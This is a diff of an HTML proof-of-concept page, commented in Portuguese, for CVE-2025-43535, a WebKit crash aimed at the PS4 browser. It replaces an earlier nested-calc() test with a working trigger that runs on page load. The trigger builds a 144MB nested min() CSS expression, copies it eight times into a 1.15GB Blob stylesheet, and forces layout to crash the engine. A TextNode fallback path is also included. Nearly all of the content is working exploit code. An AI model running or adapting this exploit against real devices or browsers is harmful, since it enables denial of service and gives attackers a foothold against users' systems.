@@ -1,142 +1,338 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<!--
+  PoC: CVE-2025-43535 — Variante 1 · Blob Multi-Chunk
+
+  PROBLEMA ANTERIOR:
+    depth=26 (576MB) → RangeError: Invalid string length
+    Limite do JSC no PS4 está entre 288MB e 576MB
+
+  SOLUÇÃO:
+    BASE_DEPTH = 24 → string de 144MB (bem abaixo do limite)
+    depth=27 montado via Blob com 8 referências ao mesmo bloco:
+
+    min(
+      min( min(e24,e24), min(e24,e24) ),    ← depth=26 esq
+      min( min(e24,e24), min(e24,e24) )     ← depth=26 dir
+    )
+
+    Pico JS heap: 144MB
+    Blob em C++:  1.15GB
+    Trigger WebKit: depth=27 idêntico ao original
+-->
+<html>
 <head>
 <meta charset="UTF-8">
-<title>V1 Instrumented</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CVE-2025-43535 — V1 Blob Multi-Chunk</title>
 <style>
-body{background:#0a0a0a;color:#88ff88;font-family:monospace;padding:16px}
-#log{background:#111;border:1px solid #88ff88;padding:12px;height:320px;overflow-y:auto;font-size:12px}
-.phase{color:#ffbb00}
-.ok{color:#00ff88}
-.err{color:#ff4444}
+  body  { background:#0a0a0a; color:#88ff88; font-family:monospace;
+          padding:16px; margin:0; font-size:13px; }
+  #log  { background:#111; border:1px solid #2a4a2a; padding:10px;
+          height:62vh; overflow-y:auto; font-size:11px; line-height:1.7; }
+  .ok   { color:#00ff88 }
+  .fail { color:#ff4444 }
+  .info { color:#ffcc44 }
+  .warn { color:#ff8844 }
+  .crash{ color:#ff44ff; font-weight:bold; font-size:1.1em }
+  .dim  { color:#336633 }
+  .bar  { background:#0a1a0a; border:1px solid #1a3a1a; color:#44aa44;
+          padding:6px 10px; margin-bottom:8px; font-size:11px; }
 </style>
 </head>
 <body>
 
-<h3>CVE-2025-43535 — Variante 1 Instrumentada (Original)</h3>
+<div style="color:#aaffaa;font-size:12px;margin-bottom:6px">
+  CVE-2025-43535 · V1 isolada · BASE=24 (144MB) · Blob=1.15GB
+</div>
+<div class="bar" id="bar">Aguardando...</div>
 <div id="log"></div>
+<div id="stage" style="position:absolute;top:-9999px;left:-9999px;
+                       width:1px;height:1px;overflow:hidden"></div>
 
 <script>
 "use strict";
 
-const logEl = document.getElementById("log");
+const logEl = document.getElementById('log');
+const barEl = document.getElementById('bar');
+const stage = document.getElementById('stage');
 
-function L(msg, cls){
-  const t = performance.now().toFixed(2);
-  const line = `[${t}] ${msg}`;
-  const div = document.createElement("div");
-  div.textContent = line;
-  div.className = cls || "";
-  logEl.appendChild(div);
-  logEl.scrollTop = logEl.scrollHeight;
-  console.log(line);
+function L(m, c) {
+  logEl.innerHTML += '<div class="' + (c||'dim') + '">' + m + '</div>';
+  logEl.scrollTop  = logEl.scrollHeight;
 }
+function bar(m) { barEl.textContent = m; }
 
-function setPhase(name){
-  document.title = name;
-  L("===== " + name + " =====","phase");
-}
-
-function wait(ms){
-  return new Promise(r=>setTimeout(r,ms));
-}
-
-/* ===========================
-   MAKEDEEPCALC ORIGINAL
-   =========================== */
-function makeDeepcalc(depth, unit){
-  if(depth <= 0) return `10${unit}`;
-  return `calc(${makeDeepcalc(depth-1, unit)} + ${depth}${unit})`;
-}
-
-/* ===========================
-   TESTE DE UMA PROFUNDIDADE
-   =========================== */
-async function testDepth(depth){
-
-  L("════════════════════════════════════");
-  L("TESTANDO DEPTH = " + depth);
-
-  const el = document.createElement("div");
-  el.style.cssText = "position:absolute;top:-9999px";
-  document.body.appendChild(el);
-
-  const sheet = document.createElement("style");
-  document.head.appendChild(sheet);
-
-  /* PHASE 1 — BUILD STRING */
-  setPhase("PHASE 1 BUILD");
-  let calcStr = makeDeepcalc(depth,"px");
-  L("String construída — length=" + calcStr.length,"ok");
-  await wait(100);
-
-  /* PHASE 2 — INSERT STYLESHEET */
-  setPhase("PHASE 2 INSERT STYLE");
-  sheet.textContent = `div.test { width:${calcStr}; height:${calcStr}; }`;
-  L("Stylesheet inserido","ok");
-  await wait(100);
-
-  /* PHASE 3 — ACCESS CSSOM */
-  setPhase("PHASE 3 CSSOM ACCESS");
-  try{
-    let rules = sheet.sheet?.cssRules;
-    L("cssRules length=" + (rules?rules.length:"null"),"ok");
-  }catch(e){
-    L("Erro cssRules: "+e,"err");
+// ─────────────────────────────────────────────────────────────
+// Constrói expressão min() iterativamente até depth.
+// GC hint a cada passo: null-ifica step anterior antes do próximo.
+// ─────────────────────────────────────────────────────────────
+function buildIterative(depth) {
+  var e = '1px';
+  for (var d = 1; d <= depth; d++) {
+    var next = 'min(' + e + ', ' + e + ')';
+    e = null;   // GC hint
+    e = next;
   }
-  await wait(100);
-
-  /* PHASE 4 — LAYOUT */
-  setPhase("PHASE 4 LAYOUT");
-  el.className="test";
-  void el.offsetWidth;
-  L("Layout OK","ok");
-  await wait(100);
-
-  /* PHASE 5 — INLINE STYLE PATH */
-  setPhase("PHASE 5 INLINE STYLE");
-  el.style.width = calcStr;
-  el.style.height = calcStr;
-  L("Inline style aplicado","ok");
-  await wait(100);
-
-  /* PHASE 6 — RE-LAYOUT */
-  setPhase("PHASE 6 RE-LAYOUT");
-  void el.offsetWidth;
-  let cs = getComputedStyle(el).width;
-  L("Computed width="+cs,"ok");
-  await wait(100);
-
-  document.head.removeChild(sheet);
-  document.body.removeChild(el);
-
-  setPhase("DEPTH COMPLETO "+depth);
-  L("DEPTH "+depth+" COMPLETO","ok");
+  return e;
 }
 
-/* ===========================
-   EXECUÇÃO
-   =========================== */
-(async function(){
+// ─────────────────────────────────────────────────────────────
+// TRIGGER PRINCIPAL
+// ─────────────────────────────────────────────────────────────
+function run() {
 
-  L("=== INÍCIO V1 INSTRUMENTADA ===");
+  var BASE_DEPTH   = 24;   // 144MB — abaixo do limite JSC do PS4
+  var TARGET_DEPTH = 27;   // depth do crash original
 
-  /* Ajuste aqui se quiser testar mais profundo */
-  const depths = [50,100,150,200,300,400,500];
+  var estBase = Math.round((9 * Math.pow(2, BASE_DEPTH)) / 1024 / 1024);
+  var estBlob = Math.round((9 * Math.pow(2, TARGET_DEPTH)) / 1024 / 1024);
 
-  for(const d of depths){
-    try{
-      await testDepth(d);
-    }catch(e){
-      L("ERRO CAPTURADO: "+e,"err");
+  L('═══════════════════════════════════════', 'info');
+  L('CVE-2025-43535 — V1 Blob Multi-Chunk', 'info');
+  L('BASE_DEPTH=' + BASE_DEPTH + ' (~' + estBase + 'MB JS heap)', 'info');
+  L('TARGET_DEPTH=' + TARGET_DEPTH + ' (~' + estBlob + 'MB Blob C++)', 'info');
+  L('═══════════════════════════════════════', 'info');
+
+  // ── Fase 1: construir bloco base (144MB) ─────────────────
+  bar('[1/5] Construindo depth=' + BASE_DEPTH + ' (~' + estBase + 'MB)...');
+  L('[1/5] Construindo bloco base...', 'warn');
+
+  // Yield antes do trabalho pesado
+  setTimeout(function() {
+
+    var eBase;
+    try {
+      eBase = buildIterative(BASE_DEPTH);
+      L('[1/5] depth=' + BASE_DEPTH + ' OK — ' +
+        Math.round(eBase.length / 1024 / 1024) + 'MB ✓', 'ok');
+    } catch(err) {
+      L('[1/5] Falhou: ' + err, 'fail');
+      // Tentar depth=23 (72MB) como segunda opção
+      try {
+        BASE_DEPTH = 23;
+        eBase = buildIterative(BASE_DEPTH);
+        L('[1/5] depth=23 OK — ' +
+          Math.round(eBase.length / 1024 / 1024) + 'MB ✓', 'ok');
+      } catch(err2) {
+        L('[1/5] depth=23 também falhou: ' + err2, 'fail');
+        bar('ERRO na fase 1');
+        return;
+      }
     }
-    await wait(500);
-  }
 
-  L("=== FIM DOS TESTES ===","ok");
+    // ── Fase 2: montar CSS no Blob ──────────────────────────
+    bar('[2/5] Criando Blob depth=' + TARGET_DEPTH + ' em C++...');
+    L('[2/5] Montando Blob com 8 refs ao bloco base...', 'warn');
+    L('[2/5] Estrutura: min(min(min(e,e),min(e,e)),min(min(e,e),min(e,e)))', 'info');
 
-})();
+    setTimeout(function() {
+
+      var blobUrl, blobSize;
+      try {
+        // Montar depth=27 a partir de depth=24:
+        // Cada 'eBase' é a MESMA referência JS de 144MB.
+        // O Blob copia os bytes para C++ — eBase aparece 8x
+        // no CSS final mas só existe 1x no heap JS.
+        var blob = new Blob([
+          // abertura
+          '.t{width:min(',
+            // depth=26 esquerdo
+            'min(',
+              'min(', eBase, ',', eBase, ')',
+              ',',
+              'min(', eBase, ',', eBase, ')',
+            ')',
+            ',',
+            // depth=26 direito
+            'min(',
+              'min(', eBase, ',', eBase, ')',
+              ',',
+              'min(', eBase, ',', eBase, ')',
+            ')',
+          // fechamento width + height igual
+          ');height:min(',
+            'min(',
+              'min(', eBase, ',', eBase, ')',
+              ',',
+              'min(', eBase, ',', eBase, ')',
+            ')',
+            ',',
+            'min(',
+              'min(', eBase, ',', eBase, ')',
+              ',',
+              'min(', eBase, ',', eBase, ')',
+            ')',
+          ')}'
+        ], { type: 'text/css' });
+
+        blobSize = blob.size;
+        blobUrl  = URL.createObjectURL(blob);
+
+        // Liberar string JS — Blob tem sua própria cópia em C++
+        eBase = null;
+
+        L('[2/5] Blob: ' + Math.round(blobSize / 1024 / 1024) +
+          'MB em C++ heap ✓', 'ok');
+        L('[2/5] eBase liberado do JS heap ✓', 'ok');
+
+      } catch(err) {
+        eBase = null;
+        L('[2/5] Falha ao criar Blob: ' + err, 'fail');
+        bar('ERRO na fase 2');
+        return;
+      }
+
+      // ── Fase 3: carregar via <link> ─────────────────────────
+      bar('[3/5] Carregando stylesheet (' +
+          Math.round(blobSize / 1024 / 1024) + 'MB)...');
+      L('[3/5] Injetando <link rel=stylesheet href=blob:...>', 'info');
+
+      var el = document.createElement('div');
+      el.className = 't';
+      el.style.cssText = 'position:absolute;visibility:hidden';
+      stage.appendChild(el);
+
+      var link    = document.createElement('link');
+      link.rel    = 'stylesheet';
+      link.href   = blobUrl;
+
+      link.onload = function() {
+        L('[3/5] Stylesheet carregada ✓', 'ok');
+
+        // ── Fase 4: forçar avaliação WebKit ──────────────────
+        bar('[4/5] Forçando layout — WebKit avalia depth=' +
+            TARGET_DEPTH + '...');
+        L('[4/5] Forçando offsetWidth + getComputedStyle...', 'warn');
+        L('[4/5] → WebKit processa min(depth=27) = 2^27 = 134M operações', 'warn');
+
+        setTimeout(function() {
+          try {
+            void el.offsetWidth;
+            L('[4/5] offsetWidth OK', 'ok');
+          } catch(e) {
+            L('[4/5] offsetWidth: ' + e, 'fail');
+          }
+          try {
+            var w = window.getComputedStyle(el).getPropertyValue('width');
+            var h = window.getComputedStyle(el).getPropertyValue('height');
+            L('[4/5] width="' + w + '" height="' + h + '"', 'ok');
+          } catch(e) {
+            L('[4/5] getComputedStyle: ' + e, 'fail');
+          }
+
+          // ── Fase 5: cleanup ─────────────────────────────────
+          bar('[5/5] Cleanup...');
+          try { URL.revokeObjectURL(blobUrl); } catch(e) {}
+          try { document.head.removeChild(link); } catch(e) {}
+          try { stage.removeChild(el); } catch(e) {}
+
+          L('[5/5] Cleanup ✓', 'ok');
+          L('', '');
+          L('═══════════════════════════════════════', 'info');
+          L('RESULTADO:', 'info');
+          L('  Crash/reload = CVE-2025-43535 PRESENTE', 'crash');
+          L('  Sem crash = patched ou WebKit limitou eval', 'ok');
+          L('═══════════════════════════════════════', 'info');
+          bar('DONE');
+        }, 50);
+      };
+
+      link.onerror = function() {
+        L('[3/5] Blob URL falhou — usando fallback TextNode', 'warn');
+        try { URL.revokeObjectURL(blobUrl); } catch(e) {}
+        try { document.head.removeChild(link); } catch(e) {}
+        try { stage.removeChild(el); } catch(e) {}
+        fallbackTextNode(TARGET_DEPTH);
+      };
+
+      document.head.appendChild(link);
+
+    }, 80);
+  }, 100);
+}
+
+// ─────────────────────────────────────────────────────────────
+// FALLBACK: <style> via TextNodes separados
+// Nunca concatena strings grandes no JS heap
+// ─────────────────────────────────────────────────────────────
+function fallbackTextNode(targetDepth) {
+  L('[FB] Fallback TextNode — depth=' + (targetDepth - 3) + '...', 'warn');
+  bar('[FB] Construindo...');
+
+  setTimeout(function() {
+    var baseD = targetDepth - 3; // 24
+    var eBase;
+
+    try {
+      eBase = buildIterative(baseD);
+      L('[FB] base OK: ' + Math.round(eBase.length/1024/1024) + 'MB', 'ok');
+    } catch(err) {
+      L('[FB] Falhou: ' + err, 'fail');
+      bar('FALHOU');
+      return;
+    }
+
+    try {
+      var styleEl = document.createElement('style');
+      document.head.appendChild(styleEl);
+
+      // Inserir o CSS em pedaços via DOM — nunca concatena em JS
+      var parts = [
+        '.t2{width:min(min(min(',
+        eBase, ',', eBase,
+        '),min(',
+        eBase, ',', eBase,
+        ')),min(min(',
+        eBase, ',', eBase,
+        '),min(',
+        eBase, ',', eBase,
+        ')))}'
+      ];
+
+      eBase = null; // liberar antes de inserir
+
+      for (var i = 0; i < parts.length; i++) {
+        styleEl.appendChild(document.createTextNode(parts[i]));
+        parts[i] = null; // liberar cada parte após inserir
+      }
+
+      L('[FB] CSS injetado via TextNodes ✓', 'ok');
+      bar('[FB] Forçando layout...');
+
+      var el = document.createElement('div');
+      el.className = 't2';
+      el.style.cssText = 'position:absolute;visibility:hidden';
+      stage.appendChild(el);
+
+      setTimeout(function() {
+        try {
+          void el.offsetWidth;
+          var w = window.getComputedStyle(el).getPropertyValue('width');
+          L('[FB] width="' + w + '"', 'ok');
+        } catch(e) {
+          L('[FB] Erro no layout: ' + e, 'fail');
+        }
+        try { stage.removeChild(el); } catch(e) {}
+        try { document.head.removeChild(styleEl); } catch(e) {}
+
+        L('', '');
+        L('RESULTADO (fallback):', 'info');
+        L('  Crash/reload = BUG PRESENTE', 'crash');
+        L('  Sem crash = patched', 'ok');
+        bar('FB DONE');
+      }, 50);
+
+    } catch(err) {
+      eBase = null;
+      L('[FB] Erro: ' + err, 'fail');
+      bar('FALHOU');
+    }
+  }, 50);
+}
+
+window.addEventListener('load', function() {
+  setTimeout(run, 200);
+});
 </script>
-
 </body>
 </html>
